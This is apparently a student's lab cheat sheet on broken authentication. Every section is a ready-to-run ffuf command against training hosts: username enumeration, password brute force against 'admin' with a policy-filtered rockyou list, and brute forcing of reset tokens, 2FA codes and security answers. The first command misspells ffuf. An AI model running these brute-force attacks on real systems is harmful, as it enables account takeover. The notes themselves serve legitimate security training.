# Broken Authentication

## Fuzzing for usernames
### FFUF
```bash
fuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u http://94.237.60.100:34962/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
```

## Password Brute Force
### Making a list
Grep'ing out words that can't be the password due to password policy
```bash
grep '[[:upper:]]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
```
### Brute Force Password with ffuf
```bash
ffuf -w ./custom_wordlist.txt -u http://94.237.51.73:37193/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
```
### Attacking Weak Password Reset Tokens
Create a list of possible tokens
```bash
seq -w 0 9999 > tokens.txt
```
FFUF to fuzz the token
```bash
ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr "The provided token is invalid"
```
### Attacking 2FA
Create a list of tokens
```bash
seq -w 0 9999 > tokens.txt
```
FFUF to fuzz the token
```bash
ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code"
```
### Vulnerable Password resets
Create a list from .csv
```bash
cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt
```
Set up FFuF to fuzz the correct response
```bash
ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."
```
